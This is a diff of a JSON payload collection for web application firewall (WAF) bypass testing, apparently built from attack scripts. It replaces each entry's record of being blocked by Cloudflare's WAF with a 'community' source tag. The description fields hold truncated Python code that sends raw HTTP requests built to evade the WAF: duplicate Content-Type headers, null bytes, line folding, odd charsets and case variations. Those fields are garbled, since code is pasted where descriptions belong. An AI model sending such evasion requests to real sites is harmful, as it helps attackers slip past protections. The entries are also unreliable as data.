@@ -11,11 +11,7 @@
       "description": "text/html', 'application/octet-stream',\n           'multipart/mixed', 'text/xml', '', 'x-custom/type",
       "technique": "direct_injection",
       "source_file": "waf_round34_desync.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xxe-0002",
@@ -25,11 +21,7 @@
       "description": "application/x-www-form-urlencoded; charset=utf-16',\n    'application/x-www-form-urlencoded; charset=utf-32',\n    'application/x-www-form-urlencoded; charset=iso-2022-jp',\n    'application/x-www-form-urlencoded; charset=euc-jp',\n    'application/x-www-form-urlencoded; charset=shift_jis',\n    'application/x-www-form-urlencoded; charset=windows-31j',\n    'application/x-www-form-urlencoded; boundary=fake',\n]:\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: \" + ct.encode() + b\"\\r\\n\"\n        b\"Content-Length: \" + str(len(payload_body)).encode() + b\"\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + payload_body)\n\n# D3: Duplicate Content-Type headers\nraw_req(\n    b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n    b\"Content-Type: text/plain\\r\\n\"\n    b\"Content-Type: application/x-www-form-urlencoded\\r\\n\"\n    b\"Content-Length: \" + str(len(payload_body)).encode() + b\"\\r\\n\"\n    b\"Connection: close\\r\\n\\r\\n\" + payload_body)\n\nraw_req(\n    b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n    b\"Content-Type: application/x-www-form-urlencoded\\r\\n\"\n    b\"Content-Type: text/plain\\r\\n\"\n    b\"Content-Length: \" + str(len(payload_body)).encode() + b\"\\r\\n\"\n    b\"Connection: close\\r\\n\\r\\n\" + payload_body)\n\n# D4: Content-Type with null byte\nraw_req(\n    b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n    b\"Content-Type: application/x-www-form-urlencoded\\x00\\r\\n\"\n    b\"Content-Length: \" + str(len(payload_body)).encode() + b\"\\r\\n\"\n    b\"Connection: close\\r\\n\\r\\n\" + payload_body)\n\n# D5: Content-Type with line folding (obsolete but some parsers accept)\nraw_req(\n    b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n    b\"Content-Type: application/\\r\\n x-www-form-urlencoded\\r\\n\"\n    b\"Content-Length: \" + str(len(payload_body)).encode() + b\"\\r\\n\"\n    b\"Connection: close\\r\\n\\r\\n\" + payload_body)\n\n# D6: Content-Type case variations\nfor ct in ['APPLICATION/X-WWW-FORM-URLENCODED', 'Application/X-Www-Form-Urlencoded',\n           'APPLICATION/JSON', 'Application/Json",
       "technique": "encoding",
       "source_file": "waf_round81_waffled.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     }
   ]
 }
